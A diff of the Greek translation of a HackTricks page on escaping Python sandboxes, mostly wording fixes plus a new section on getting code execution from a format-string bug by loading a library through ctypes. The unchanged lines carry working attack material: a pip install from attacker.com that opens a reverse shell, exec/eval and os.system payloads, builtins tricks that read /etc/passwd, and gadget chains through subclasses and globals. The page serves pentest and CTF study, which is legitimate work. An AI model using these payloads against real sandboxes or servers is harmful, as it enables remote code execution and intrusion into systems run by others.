@@ -1,8 +1,8 @@
 # Bypass Python sandboxes
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -85,19 +85,19 @@ print(base64.b64encode(pickle.dumps(P(), protocol=0)))
 
 ### Πακέτο Pip
 
-Τέχνασμα που μοιράστηκε από **@isHaacK**
+Τέχνασμα που μοιράστηκε ο **@isHaacK**
 
-Εάν έχετε πρόσβαση στο `pip` ή `pip.main()`, μπορείτε να εγκαταστήσετε ένα αυθαίρετο πακέτο και να αποκτήσετε ένα reverse shell καλώντας:
+Αν έχετε πρόσβαση στο `pip` ή `pip.main()`, μπορείτε να εγκαταστήσετε ένα αυθαίρετο πακέτο και να αποκτήσετε ένα reverse shell καλώντας:
 ```bash
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
-Μπορείτε να κατεβάσετε το πακέτο για να δημιουργήσετε το reverse shell εδώ. Παρακαλώ, σημειώστε ότι πριν το χρησιμοποιήσετε θα πρέπει να **αποσυμπιέσετε, να αλλάξετε το `setup.py`, και να βάλετε τη διεύθυνση IP σας για το reverse shell**:
+Μπορείτε να κατεβάσετε το πακέτο για να δημιουργήσετε το reverse shell εδώ. Παρακαλώ, σημειώστε ότι πριν το χρησιμοποιήσετε θα πρέπει να **αποσυμπιέσετε, να αλλάξετε το `setup.py` και να βάλετε τη διεύθυνση IP σας για το reverse shell**:
 
 {% file src="../../../.gitbook/assets/Reverse.tar (1).gz" %}
 
 {% hint style="info" %}
-Αυτό το πακέτο ονομάζεται `Reverse`. Ωστόσο, έχει σχεδιαστεί ειδικά ώστε όταν βγείτε από το reverse shell η υπόλοιπη εγκατάσταση να αποτύχει, έτσι ώστε **να μην αφήσετε κανένα επιπλέον πακέτο python εγκατεστημένο στον διακομιστή** όταν φύγετε.
+Αυτό το πακέτο ονομάζεται `Reverse`. Ωστόσο, έχει κατασκευαστεί ειδικά ώστε όταν βγείτε από το reverse shell η υπόλοιπη εγκατάσταση να αποτύχει, έτσι ώστε **να μην αφήσετε κανένα επιπλέον πακέτο python εγκατεστημένο στον διακομιστή** όταν φύγετε.
 {% endhint %}
 
 ## Eval-ing python code
@@ -106,7 +106,7 @@ pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 Σημειώστε ότι το exec επιτρέπει πολυγραμμικά strings και ";", αλλά το eval δεν το επιτρέπει (ελέγξτε τον τελεστή walrus)
 {% endhint %}
 
-Αν ορισμένοι χαρακτήρες είναι απαγορευμένοι μπορείτε να χρησιμοποιήσετε την **hex/octal/B64** αναπαράσταση για να **bypass** τον περιορισμό:
+Εάν ορισμένοι χαρακτήρες είναι απαγορευμένοι μπορείτε να χρησιμοποιήσετε την **hex/octal/B64** αναπαράσταση για να **bypass** τον περιορισμό:
 ```python
 exec("print('RCE'); __import__('os').system('ls')") #Using ";"
 exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
@@ -197,7 +197,7 @@ class _:pass
 
 #### RCE με προσαρμοσμένες κλάσεις
 
-Μπορείτε να τροποποιήσετε κάποιες **μεθόδους κλάσης** (_υπεργράφοντας υπάρχουσες μεθόδους κλάσης ή δημιουργώντας μια νέα κλάση_) ώστε να **εκτελούν αυθαίρετο κώδικα** όταν **ενεργοποιούνται** χωρίς να τις καλείτε άμεσα.
+Μπορείτε να τροποποιήσετε κάποιες **μεθόδους κλάσης** (_υπεργράφοντας υπάρχουσες μεθόδους κλάσης ή δημιουργώντας μια νέα κλάση_) ώστε να **εκτελούν αυθαίρετο κώδικα** όταν **ενεργοποιηθούν** χωρίς να τις καλείτε άμεσα.
 ```python
 # This class has 3 different ways to trigger RCE without directly calling any function
 class RCE:
@@ -332,7 +332,7 @@ __builtins__.__dict__['__import__']("os").system("ls")
 Όταν δεν έχετε `__builtins__`, δεν θα μπορείτε να εισάγετε τίποτα ούτε καν να διαβάσετε ή να γράψετε αρχεία καθώς **όλες οι παγκόσμιες συναρτήσεις** (όπως `open`, `import`, `print`...) **δεν είναι φορτωμένες**.\
 Ωστόσο, **κατά προεπιλογή, η python εισάγει πολλά modules στη μνήμη**. Αυτά τα modules μπορεί να φαίνονται αθώα, αλλά μερικά από αυτά **εισάγουν επίσης επικίνδυνες** λειτουργίες μέσα τους που μπορούν να προσπελαστούν για να αποκτήσετε ακόμη και **τυχαία εκτέλεση κώδικα**.
 
-Στα παρακάτω παραδείγματα μπορείτε να παρατηρήσετε πώς να **καταχραστείτε** μερικά από αυτά τα "**αθώα**" modules που έχουν φορτωθεί για να **προσπελάσετε** **επικίνδυνες** **λειτουργίες** μέσα τους.
+Στα παρακάτω παραδείγματα μπορείτε να παρατηρήσετε πώς να **καταχραστείτε** μερικά από αυτά τα "**αθώα**" modules που έχουν φορτωθεί για να **προσεγγίσετε** **επικίνδυνες** **λειτουργίες** μέσα τους.
 
 **Python2**
 ```python
@@ -382,7 +382,7 @@ get_flag.__globals__['__builtins__']
 __builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
 __builtins__["__import__"]('os').system('ls')
 ```
-### Builtins payloads
+### Ενσωματωμένα payloads
 ```python
 # Possible payloads once you have found the builtins
 __builtins__["open"]("/etc/passwd").read()
@@ -454,7 +454,7 @@ defined_func.__class__.__base__.__subclasses__()
 ```
 ### Εύρεση επικίνδυνων βιβλιοθηκών που έχουν φορτωθεί
 
-Για παράδειγμα, γνωρίζοντας ότι με τη βιβλιοθήκη **`sys`** είναι δυνατό να **εισαγάγετε αυθαίρετες βιβλιοθήκες**, μπορείτε να αναζητήσετε όλα τα **modules που έχουν φορτωθεί και έχουν εισάγει το sys μέσα τους**:
+Για παράδειγμα, γνωρίζοντας ότι με τη βιβλιοθήκη **`sys`** είναι δυνατή η **εισαγωγή αυθαίρετων βιβλιοθηκών**, μπορείτε να αναζητήσετε όλα τα **modules που έχουν φορτωθεί και περιέχουν την εισαγωγή του sys**:
 ```python
 [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
 ['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
@@ -517,7 +517,7 @@ builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalE
 pdb:
 """
 ```
-Επιπλέον, αν νομίζετε ότι **άλλες βιβλιοθήκες** μπορεί να είναι σε θέση να **καλέσουν συναρτήσεις για να εκτελέσουν εντολές**, μπορούμε επίσης να **φιλτράρουμε κατά ονόματα συναρτήσεων** μέσα στις πιθανές βιβλιοθήκες:
+Επιπλέον, αν νομίζετε ότι **άλλες βιβλιοθήκες** μπορεί να είναι σε θέση να **καλέσουν συναρτήσεις για να εκτελέσουν εντολές**, μπορούμε επίσης να **φιλτράρουμε με βάση τα ονόματα συναρτήσεων** μέσα στις πιθανές βιβλιοθήκες:
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
 bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
@@ -670,7 +670,7 @@ print(SEARCH_FOR)
 if __name__ == "__main__":
 main()
 ```
-You can check the output of this script on this page:
+Μπορείτε να ελέγξετε την έξοδο αυτού του script σε αυτή τη σελίδα:
 
 {% content-ref url="https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md" %}
 [https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md](https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md)
@@ -679,11 +679,6 @@ You can check the output of this script on this page:
 ## Python Format String
 
 Αν **στείλετε** μια **αλφαριθμητική** σε python που πρόκειται να **μορφοποιηθεί**, μπορείτε να χρησιμοποιήσετε `{}` για να αποκτήσετε πρόσβαση σε **εσωτερικές πληροφορίες της python.** Μπορείτε να χρησιμοποιήσετε τα προηγούμενα παραδείγματα για να αποκτήσετε πρόσβαση σε globals ή builtins για παράδειγμα.
-
-{% hint style="info" %}
-Ωστόσο, υπάρχει μια **περιορισμός**, μπορείτε να χρησιμοποιήσετε μόνο τα σύμβολα `.[]`, οπότε **δεν θα μπορείτε να εκτελέσετε αυθαίρετο κώδικα**, μόνο να διαβάσετε πληροφορίες.\
-_**Αν ξέρετε πώς να εκτελέσετε κώδικα μέσω αυτής της ευπάθειας, παρακαλώ επικοινωνήστε μαζί μου.**_
-{% endhint %}
 ```python
 # Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
 CONFIG = {
@@ -703,7 +698,7 @@ people = PeopleInfo('GEEKS', 'FORGEEKS')
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
-Σημειώστε πώς μπορείτε να **πρόσβαση σε χαρακτηριστικά** με κανονικό τρόπο με μια **τελεία** όπως `people_obj.__init__` και **στοιχείο dict** με **παρενθέσεις** χωρίς αποσπάσματα `__globals__[CONFIG]`
+Σημειώστε πώς μπορείτε να **πρόσβαση σε χαρακτηριστικά** με κανονικό τρόπο με μια **τελεία** όπως `people_obj.__init__` και **στοιχείο dict** με **παρενθέσεις** χωρίς εισαγωγικά `__globals__[CONFIG]`
 
 Επίσης σημειώστε ότι μπορείτε να χρησιμοποιήσετε `.__dict__` για να απαριθμήσετε τα στοιχεία ενός αντικειμένου `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
@@ -743,14 +738,58 @@ return 'HAL 9000'
 
 # Access an element through several links
 {whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
+
+# Example from https://corgi.rip/posts/buckeye-writeups/
+secret_variable = "clueless"
+x = new_user.User(username='{i.find.__globals__[so].mapperlib.sys.modules[__main__].secret_variable}',password='lol')
+str(x) # Out: clueless
 ```
+### Από τη μορφή στην εκτέλεση κώδικα φορτώνοντας βιβλιοθήκες
+
+Σύμφωνα με την [**πρόκληση TypeMonkey από αυτή την αναφορά**](https://corgi.rip/posts/buckeye-writeups/), είναι δυνατόν να φορτωθούν αυθαίρετες βιβλιοθήκες από το δίσκο εκμεταλλευόμενοι την ευπάθεια της μορφής συμβολοσειράς στην python.
+
+Ως υπενθύμιση, κάθε φορά που εκτελείται μια ενέργεια στην python, εκτελείται κάποια συνάρτηση. Για παράδειγμα, το `2*3` θα εκτελέσει **`(2).mul(3)`** ή **`{'a':'b'}['a']`** θα είναι **`{'a':'b'}.__getitem__('a')`**.
+
+Έχετε περισσότερα όπως αυτό στην ενότητα [**Εκτέλεση Python χωρίς κλήσεις**](./#python-execution-without-calls).
+
+Μια ευπάθεια μορφής συμβολοσειράς στην python δεν επιτρέπει την εκτέλεση συνάρτησης (δεν επιτρέπει τη χρήση παρενθέσεων), οπότε δεν είναι δυνατόν να αποκτήσετε RCE όπως `'{0.system("/bin/sh")}'.format(os)`.\
+Ωστόσο, είναι δυνατόν να χρησιμοποιήσετε `[]`. Επομένως, αν μια κοινή βιβλιοθήκη python έχει μια μέθοδο **`__getitem__`** ή **`__getattr__`** που εκτελεί αυθαίρετο κώδικα, είναι δυνατόν να τις εκμεταλλευτείτε για να αποκτήσετε RCE.
+
+Ψάχνοντας για ένα gadget όπως αυτό στην python, η αναφορά προτείνει αυτή την [**ερώτηση αναζήτησης Github**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28\_\_getitem\_\_%7C\_\_getattr\_\_%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F\&type=code). Εκεί βρήκε αυτό [το ένα](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/\_\_init\_\_.py#L463):
+```python
+class LibraryLoader(object):
+def __init__(self, dlltype):
+self._dlltype = dlltype
+
+def __getattr__(self, name):
+if name[0] == '_':
+raise AttributeError(name)
+try:
+dll = self._dlltype(name)
+except OSError:
+raise AttributeError(name)
+setattr(self, name, dll)
+return dll
+
+def __getitem__(self, name):
+return getattr(self, name)
+
+cdll = LibraryLoader(CDLL)
+pydll = LibraryLoader(PyDLL)
+```
+Αυτή η συσκευή επιτρέπει να **φορτώσετε μια βιβλιοθήκη από τον δίσκο**. Επομένως, είναι απαραίτητο να **γράψετε ή να ανεβάσετε τη βιβλιοθήκη για να φορτωθεί** σωστά κατασκευασμένη στον επιτιθέμενο διακομιστή.
+```python
+'{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
+```
+Η πρόκληση στην πραγματικότητα εκμεταλλεύεται μια άλλη ευπάθεια στον διακομιστή που επιτρέπει τη δημιουργία αυθαίρετων αρχείων στον δίσκο των διακομιστών.
+
 ## Ανάλυση Αντικειμένων Python
 
 {% hint style="info" %}
-Αν θέλετε να **μάθετε** για τον **bytecode Python** σε βάθος, διαβάστε αυτή την **καταπληκτική** ανάρτηση για το θέμα: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
+Αν θέλετε να **μάθετε** για τον **bytecode της python** σε βάθος, διαβάστε αυτή την **καταπληκτική** ανάρτηση για το θέμα: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 {% endhint %}
 
-Σε ορισμένα CTFs μπορεί να σας δοθεί το όνομα μιας **προσαρμοσμένης συνάρτησης όπου βρίσκεται η σημαία** και πρέπει να δείτε τα **εσωτερικά** της **συνάρτησης** για να την εξαγάγετε.
+Σε ορισμένα CTFs μπορεί να σας παρέχεται το όνομα μιας **προσαρμοσμένης συνάρτησης όπου βρίσκεται η σημαία** και πρέπει να δείτε τα **εσωτερικά** της **συνάρτησης** για να την εξαγάγετε.
 
 Αυτή είναι η συνάρτηση προς επιθεώρηση:
 ```python
@@ -988,7 +1027,7 @@ mydict['__builtins__'] = __builtins__
 codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
 function_type(codeobj, mydict, None, None, None)()
 ```
-Αν δεν μπορείτε να αποκτήσετε πρόσβαση στο `eval` ή `exec`, μπορείτε να δημιουργήσετε μια **κατάλληλη συνάρτηση**, αλλά η άμεση κλήση της συνήθως θα αποτύχει με: _ο κατασκευαστής δεν είναι προσβάσιμος σε περιορισμένο περιβάλλον_. Έτσι, χρειάζεστε μια **συνάρτηση που δεν είναι στο περιορισμένο περιβάλλον για να καλέσετε αυτή τη συνάρτηση.**
+Αν δεν μπορείτε να αποκτήσετε πρόσβαση στο `eval` ή `exec`, μπορείτε να δημιουργήσετε μια **κατάλληλη συνάρτηση**, αλλά η άμεση κλήση της συνήθως θα αποτύχει με: _ο κατασκευαστής δεν είναι προσβάσιμος σε περιορισμένη λειτουργία_. Έτσι, χρειάζεστε μια **συνάρτηση που δεν είναι στο περιορισμένο περιβάλλον για να καλέσετε αυτή τη συνάρτηση.**
 ```python
 #Compile a regular print
 ftype = type(lambda: None)
@@ -1031,18 +1070,17 @@ print(f"\nNot a Super User!!!\n")
 * [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
 * [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 
-
 {% hint style="success" %}
-Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Υποστήριξη HackTricks</summary>
+<summary>Support HackTricks</summary>
 
-* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
-* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
